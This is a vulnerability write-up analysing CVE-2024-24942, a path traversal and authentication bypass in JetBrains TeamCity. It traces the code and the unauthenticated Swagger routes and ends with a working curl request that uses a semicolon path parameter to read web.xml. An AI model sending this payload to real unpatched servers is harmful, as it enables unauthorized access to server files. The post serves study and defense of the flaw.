---
author: AvanthikaAnand
layout: post
title: Diving deep into Jetbrains TeamCity Part 2 - Analysing CVE-2024-24942 leading to unauthenticated Path Traversal
categories:
- java
- aa
summary: This article aims to explore the details of CVE-2024-24942 and explain the process of constructing an exploit leading to Authentication Bypass and Path traversal. This article is only intended for educational purposes for understanding how vulnerabilities occur in real world.
description: This article aims to explore the details of CVE-2024-24942 and explain the process of constructing an exploit leading to Authentication Bypass and Path traversal. This article is only intended for educational purposes for understanding how vulnerabilities occur in real world.
---

## Introduction

In the first edition of our TeamCity vulnerability series, we explored a critical issue that lead to [Authentication Bypass]({% post_url 2024-05-27-jetbrains-teamcity-auth-bypass %}). Here, we continue by examining another interesting vulnerability, CVE-2024-24942. This flaw, present in JetBrains TeamCity versions prior to 2023.11.3, involves a path traversal vulnerability that allows attackers to access data within JAR archives.

| Version    | Status | Download Link    |
| -------- | ------- | ------- |
| Versions prior to 2023.11.3  | Affected    |  [https://download.jetbrains.com/teamcity/TeamCity-2023.11.2.tar.gz](https://download.jetbrains.com/teamcity/TeamCity-2023.11.2.tar.gz) |
| 2023.11.3 | Patched | [https://download.jetbrains.com/teamcity/TeamCity-2023.11.3.tar.gz](https://download.jetbrains.com/teamcity/TeamCity-2023.11.3.tar.gz) |


**<u>Note</u>**: We highly encourage going through the [first part]({% post_url 2024-05-27-jetbrains-teamcity-auth-bypass %}) of the TeamCity Vulnerability series before continuing as it provides the essential background knowledge that will enhance your grasp of the issues discussed here.

## Understanding the Patch

`CVE-2024-24942` is a path traversal vulnerability in `SwaggerUI.java` within JetBrains TeamCity. SwaggerUI, an open-source tool, generates interactive API documentation and facilitates automation tasks like triggering builds and managing projects. Static analysis and debugging pinpointed the issue to SwaggerUI.java, where improper input validation allowed attackers to exploit a path traversal flaw, granting access to restricted data within JAR archives in versions before 2023.11.3.

For the purpose of understanding the vulnerability better, lets diff the SwaggerUI.java file from both affected as well as the patched versions.

 <div align='center'><img src="/images/2024/teamcity/swaggeruiutils.png" alt="SwaggerUIUtils" height="500" width="850"/></div>

`/{path:.*}`is a URI path pattern(Java-specific), which uses regular expressions to capture any value passed after the base URI (including dots and slashes). Consider an API path, `/app/rest/swaggerui`, the above annotation specifies that any number of directories are possible after the actual path.

For example:

 * `/app/rest/swaggerui/x/y/z` will pass.
 * `/app/rest/swaggerui/../../web.xml` this should also pass.

From diffing the above files, the change is replacing the class `SwaggerUIUtil` with `SwaggerUtil` for the `getFileFromResources` method.

**<u>File</u>**: *TeamCity-2023.11.3/TeamCity/webapps/ROOT/WEB-INF/plugins/rest-api/server/rest-api-2023.09-147512.jar!/jetbrains/buildServer/server/rest/swagger/SwaggerUtil.class*

{% highlight bash lineos %}
public static InputStream getFileFromResources(@NotNull String path) {
  if (path == null) {
    $$$reportNull$$$0(0);
  }

  String fullPath = "swagger/" + path;
  if (!isValidResourcePath(fullPath)) {
    throw new IllegalArgumentException(String.format("File %s was not found", fullPath));
  } else {
    InputStream var10000 = (InputStream) Objects.requireNonNull(SwaggerUtil.class.getClassLoader().getResourceAsStream(fullPath));
    if (var10000 == null) {
      $$$reportNull$$$0(1);
    }

    return var10000;
  }
}

private static boolean isValidResourcePath(@NotNull String path) {
  if (path == null) {
    $$$reportNull$$$0(2);
  }

  return !path.contains("..") && SwaggerUtil.class.getClassLoader().getResource(path) != null;
}
{%endhighlight%}

In the patched version, the `getFileFromResources` method protects against path traversal vulnerabilities more effectively than the first due to its additional checks and validations.


## Request Interceptors

Having confirmed the presence of a path traversal vulnerability, our next step is to determine if the vulnerable endpoint requires authentication and, if so, attempt to access it without authentication. To achieve this, we need to identify the [interceptor](https://blog.0daylabs.com/2024/05/27/jetbrains-teamcity-auth-bypass/#spring-interceptors) responsible for authentication by examining the list of all interceptors called during a request.

 <div align='center'><img src="/images/2024/teamcity/request_interceptors.png" alt="TeamCity Request Interceptors" height="600"/></div>

 Through dynamic debugging, we can trace the execution flow by setting a breakpoint in the `preHandle()` of `RequestInterceptors.java`. This will capture all the interceptors that the request passes through, essentially revealing the stack of interceptors(StackTrace). The interceptors involved in the process are as follows:

{% highlight bash lineos %}
1. = {MainServerInterceptor@32568}
2. = {RegistrationInvitations@31464}
3. = {ProjectIdConverterInterceptor@31465}
4. = {AuthorizationInterceptorImpl@31466}  <---- this checks if route need authentication
5. = {TwoFactorAuthenticationInterceptor@32569}
6. = {DomainIsolationProtectionInterceptor@32670}
7. = {FirstLoginInterceptor@32671}
8. = {PluginUIContextProvider@32672}
9. = {CallableInterceptorRegistrar@32673}
10. = {DiagnosticInterceptor@32674}
11. = {CallableInterceptorRegistrar@32675}
{%endhighlight%}

`AuthorizationInterceptorImpl.java` checks if a route requires authentication. Let’s see the prehandle function of `AuthorizationInterceptorImpl.java` to see how a path is authenticated:

**<u>File</u>**: *TeamCity-2023.11.2/TeamCity/webapps/ROOT/WEB-INF/lib/web-core.jar!/jetbrains/buildServer/controllers/interceptors/AuthorizationInterceptorImpl.class*

{% highlight java lineos %}
public boolean preHandle(@NotNull final HttpServletRequest request, @NotNull final HttpServletResponse response, Object object) throws Exception {
  return (Boolean) NamedThreadFactory.executeWithNewThreadName("Handling authentication", new Callable < Boolean > () {
    public Boolean call() throws Exception {
      String unauthenticatedReason = null;

      try {
        SUser user = AuthorizationInterceptorImpl.this.tryRefreshLogin(request, response);
        String nodeId;
        if (user != null) {
          nodeId = AuthorizationInterceptorImpl.this.myUsersLoadBalancer.assignAuthenticatedUserToNode(user, request, response);
          if (nodeId != null && AuthorizationInterceptorImpl.this.redirectedToNode(nodeId, request, response)) {
            return false;
          }

          AuthorizationInterceptorImpl.this.checkUserPermissions(request);
          return AuthorizationInterceptorImpl.this.checkCsrfWithAuthenticatedUser(request, response);
        }

        nodeId = AuthorizationInterceptorImpl.this.myUsersLoadBalancer.assignUnauthenticatedRequestToNode(request, response);
        if (nodeId != null && AuthorizationInterceptorImpl.this.redirectedToNode(nodeId, request, response)) {
          return false;
        }

        String path = WebUtil.getPathWithoutContext(request);
        if (!AuthorizationInterceptorImpl.this.myAuthorizationPaths.isAuthenticationRequired(path)) {
          return true;
        }

        if (AuthorizationInterceptorImpl.this.myAuthManager.shouldNotTryToReauthenticate(request)) {
          (new UnauthorizedResponseHelper(response, false)).send(request, (String) null);
          return false;
        }

        boolean canRedirect = AuthorizationInterceptorImpl.this.isBrowserRequest(request);
        HttpAuthenticationResult authResult = AuthorizationInterceptorImpl.this.myAuthManager.processAuthenticationRequest(request, response, canRedirect);
        if (authResult.getType() == Type.AUTHENTICATED) {
          AuthorizationInterceptorImpl.this.checkUserPermissions(request);
          if (!AuthorizationInterceptorImpl.this.checkCsrfWithAuthenticatedUser(request, response)) {
            return false;
          }

          AuthorizationInterceptorImpl.checkRedirect(authResult, canRedirect);
          return true;
        }

        if (authResult.getType() == Type.UNAUTHENTICATED) {
          AuthorizationInterceptorImpl.checkRedirect(authResult, canRedirect);
          return false;
        }

        if (AuthorizationInterceptorImpl.this.adminSetupRedirect(request)) {
          if (canRedirect) {
            response.sendRedirect(request.getContextPath() + "/setupAdmin.html?init=1");
            return false;
          }

          unauthenticatedReason = "There is no administrator account on the server";
        }

        AuthorizationInterceptorImpl.this.rememberUrlIfNeeded(request, path);
      } catch (RedirectException var7) {
        RedirectException e = var7;
        response.sendRedirect(e.getRedirectUrl());
        return false;
      } catch (AccessDeniedException var8) {
        AccessDeniedException ex = var8;
        if (AuthorizationInterceptorImpl.this.isBrowserRequest(request)) {
          WebAuthUtil.addAccessDeniedMessage(request, ex);
          response.sendRedirect(OverviewController.getOverviewPageUrl(request));
          return false;
        }

        unauthenticatedReason = "Access denied: " + ex.getMessage();
      }

      AuthorizationInterceptorImpl.this.myAuthManager.processUnauthenticatedRequest(request, response, unauthenticatedReason, AuthorizationInterceptorImpl.this.isBrowserRequest(request));
      return false;
    }
  });
}
{%endhighlight%}

`!AuthorizationInterceptorImpl.this.myAuthorizationPaths.isAuthenticationRequired(path)` checks whether authentication is required for a specific path. `myAuthorizationPaths` holds information about paths(routes) and their associated authentication requirements. By adding a breakpoint in the above condition, we can get the paths which does not require authentication.

<div align='center'><img src="/images/2024/teamcity/authorization_interceptor.png" alt="Listing endpoints that doesn't need authentication" height="600"/></div>

`MyAuthorizedPaths` is calling its function `isAuthenticationRequired()`, put a breakpoint there and get all the endpoints that doesn’t require authentication.

{% highlight bash lineos %}
1 = "/.well-known/acme-challenge/**"
2 = "/app/agentParameters/*"
3 = "/app/dsl-plugins-repository/**"
4 = "/app/dsl-documentation/**"
5 = "/app/rest/2018.1/builds/*/statusIcon*"
6 = "/app/rest/2018.1/builds/aggregated/*/statusIcon*"
7 = "/app/rest/2018.1/swagger**"
8 = "/app/rest/builds/*/statusIcon*"
9 = "/app/rest/builds/aggregated/*/statusIcon*"
10 = "/app/rest/swagger**"     <-------------- no auth needed
11 = "/app/rest/latest/builds/*/statusIcon*"
12 = "/app/rest/latest/builds/aggregated/*/statusIcon*"
13 = "/app/rest/latest/swagger**"
14 = "/app/rest/ui/builds/*/statusIcon*"
15 = "/app/rest/ui/builds/aggregated/*/statusIcon*"
16 = "/app/rest/ui/swagger**"
17 = "/api/builds/*/statusIcon*"
18 = "/api/builds/aggregated/*/statusIcon*"
19 = "/api/swagger**"
20 = "/app/graphql/builds/*/statusIcon*"
21 = "/app/graphql/builds/aggregated/*/statusIcon*"
22 = "/app/graphql/swagger**"
{%endhighlight%}

The route `app/rest/swagger**` is configured as an unauthenticated endpoint. This could potentially open up the path to a path traversal vulnerability. In TeamCity, a route is handled by `RequestMappingInfoHandlerMapping` which is responsible for mapping incoming requests to their respective handlers (controllers or methods). When a request is made to a particular route, `RequestMappingInfoHandlerMapping` delegates a path matching. 

**<u>File</u>**: *TeamCity-2023.11.2/TeamCity/webapps/ROOT/WEB-INF/lib/spring-webmvc.jar!/org/springframework/web/servlet/mvc/method/RequestMappingInfoHandlerMapping.class*


{% highlight java lineos %}
protected RequestMappingInfo getMatchingMapping(RequestMappingInfo info, HttpServletRequest request) {
    return info.getMatchingCondition(request);
}
{%endhighlight%}

In Spring Framework, path matching for handling incoming requests is often done using `AntPathMatcher` from `org.springframework.util` package. `AntPathMatcher` is used to match paths against predefined patterns and supports wildcards like `*` (matching zero or more characters) and `**`(matching zero or more directories). 

The pattern `app/rest/swagger**` matches paths such as:
* `app/rest/swaggeruixyz`
* `app/rest/swaggerui/xyz` (limited to one additional directory)

This means that paths like `app/rest/swaggerXXXX/`.. are valid, however, it won't match paths like: 
* `app/rest/swaggerui/xx/yy` (to match this, we need `app/rest/swaggerui/**`, `**` after the `/`)
* `app/rest/swaggeruixx/xx/yy` (to match this, we need `app/rest/swaggerui*/**`)

 Therefore, when trying a typical traversal attack like accessing `site.com/app/rest/swaggerui/../../web.xml`, the attack does not seem to succeed.

As we approach the core of our exploit, let’s take a closer look at the following code from `AuthorizationInterceptorImpl.java` once again:

**<u>File</u>**: *TeamCity-2023.11.2/TeamCity/webapps/ROOT/WEB-INF/lib/web-core.jar!/jetbrains/buildServer/controllers/interceptors/AuthorizationInterceptorImpl.class*

{% highlight java lineos %}
String path = WebUtil.getPathWithoutContext(request);
if (!AuthorizationInterceptorImpl.this.myAuthorizationPaths.isAuthenticationRequired(path)) {
    return true;
{%endhighlight%}

The path is extracted from the request using `getPathWithoutContext()` in `WebUtil.java`. Let’s have a look at what this method does:

**<u>File</u>**: *TeamCity-2023.11.2/TeamCity/webapps/ROOT/WEB-INF/lib/web-openapi.jar!/jetbrains/buildServer/web/util/WebUtil.class*
{% highlight java lineos %}
public static String getPathWithoutContext(@NotNull HttpServletRequest request) {
    String reqURI = StringUtil.notNullize(request.getRequestURI());
    return getPathWithoutContext(request, reqURI);
}

public static String getPathWithoutContext(@NotNull HttpServletRequest request, @NotNull String reqURI) {
        return removeSessionId(removeStartingSlashes(stripContextPath(request, reqURI)));
    }
    ...

    public static String removeSessionId(@NotNull String uri) {
        int idx = uri.indexOf(59); //-> 59 ascii of ;
        return idx == -1 ? uri : uri.substring(0, idx);
    }

private static String stripContextPath(@NotNull HttpServletRequest request, @NotNull String reqURI) {
    return reqURI.substring(request.getContextPath().length());
}

@NotNull
private static String removeStartingSlashes(@NotNull String requestURI) {
    for (int i = 0; i < requestURI.length(); ++i) {
        if (requestURI.charAt(i) != '/') {
            if (i == 1) {
                return requestURI;
            }

            return '/' + requestURI.substring(i);
        }
    }

    return "/";
}
{%endhighlight%}

* `getPathWithoutContext()`: Extracts the request URI, removing the context path (base URL) and sanitizing it for further processing.
* `stripContextPath()`: Removes the context path (e.g., `/app`) from the request URI, leaving only the relevant portion (e.g., `/rest/swaggerui`).
* `removeStartingSlashes()`: Ensures the URI has only one leading slash by trimming any extra slashes (e.g., `///rest/swaggerui` becomes `/rest/swaggerui`).
* `removeSessionId()`: Strips out any session ID appended to the URI after a semicolon (`;`), returning the clean path without it. For example, if the URI is `/rest/swaggerui;JSESSIONID=123456`, this method removes `;JSESSIONID=123456`, leaving `/rest/swaggerui`. This ensures that the session information is excluded from the path.

As we have already seen in the [Part-1]({% post_url 2024-05-27-jetbrains-teamcity-auth-bypass %}) of this series that in Tomcat, the semicolon (;) is used for path parameter passing, a mechanism where additional data can be embedded in the URL without affecting the main path. For example, in a URL like `/app/rest/resource;param=value`, the part after the semicolon (`param=value`) is treated as a parameter for that specific route (`/resource`), without altering the route itself.

**<u>Note</u>**: The parameters passed will be ignored by AntPathMatcher for matching purposes.

Basically, the application custom implemented the `getPathWithoutContext()` to remove anything after a semicolon (`;`) to prevent passing path parameters. However, due to the flawed implementation, when a traversal payload is included, everything after the semicolon gets stripped. As a result, the `site.com/app/rest/swaggerui;alpha/../../file.txt` path bypasses the authentication check, the route will hit /app/rest/swaggerui and the traversal payload is mistakenly treated as a parameter to this route.

Note: Using `getPathInfo()` is different from `getRequestURI()` because it returns only the part of the request path after the servlet's mapped path, excluding the context path and any path parameters whereas `getRequestURI()` retrieves the entire URI of the request, including the context path, servlet path, and any additional path segments or parameters. This highlights how different methods of interpreting paths can lead to vulnerabilities, especially when handling elements like path parameters (`;param=value`) or traversal sequences (`../`).

## Exploit

{% highlight bash lineos %}
curl -i -s -k -X GET \
    -H 'Host: localhost:8111' \
    -H 'Accept: application/json' \
    -H 'X-TC-CSRF-Token: 2e545bf5-xxxxxxxxxxxxxxxxxxx8' \
    'http://localhost:8111/app/rest/swaggerui;asdf/../../web.xml'
{%endhighlight%}

The crafted request is sent to `http://localhost:8111/app/rest/swaggerui;asdf/../../web.xml` , where `;asdf` acts as a path parameter to manipulate how the server interprets the request. First, the `AuthorizationInterceptorImpl` sanitizes the request by stripping the path parameter (`;asdf`), effectively processing it as `http://localhost:8111/app/rest/swaggerui`. Since this endpoint is configured as unauthenticated, the request bypasses authentication. When the path reaches AntPathMatcher, it is checked against the pattern `/app/rest/swagger**`, which matches path `/app/rest/swaggerui`. The remaining portion is interpreted as a path parameter for the route. This enables traversal beyond the intended directory, providing unauthorized access to files like `web.xml`.

## References:

1. [sndav.org](https://blog.sndav.org/archives/teamcity-authentication-bypass-rce-cve-2024-23917#CVE-2024-24942){:target="_blank"}